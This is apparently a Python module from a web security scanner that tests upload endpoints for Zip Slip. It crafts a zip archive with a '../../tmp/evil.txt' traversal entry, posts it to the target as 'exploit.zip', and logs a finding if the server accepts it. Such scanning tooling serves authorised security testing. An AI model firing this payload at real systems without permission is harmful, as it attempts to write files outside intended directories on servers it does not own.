"""Archive attacks: zip slip, tar traversal."""
from core.http import get, post
from core.findings import Finding
from core.memory import log_event
import urllib.parse, io, zipfile

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    # craft zip slip
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("../../tmp/evil.txt", "pwned")
            z.writestr("normal.txt", "ok")
        buf.seek(0)
        files = {"file": ("exploit.zip", buf.read(), "application/zip")}
        resp = post(url, files=files)
        if resp.status != 0:
            text = (resp.text or "").lower()
            if "success" in text or "extracted" in text or "uploaded" in text:
                findings.append(Finding(
                    id="zipslip-{}".format(hash(url) & 0xffff),
                    target=parsed.netloc,
                    type="Zip Slip (potential)",
                    severity="high",
                    url=url,
                    parameter="file",
                    payload="zip with traversal entry",
                    evidence="Archive accepted; path traversal in entry",
                    response_snippet=resp.snippet(200),
                    confidence=0.4,
                ))
    except Exception:
        pass
    log_event(parsed.netloc, "archive_scan", {"url": url, "findings": len(findings)})
    return findings
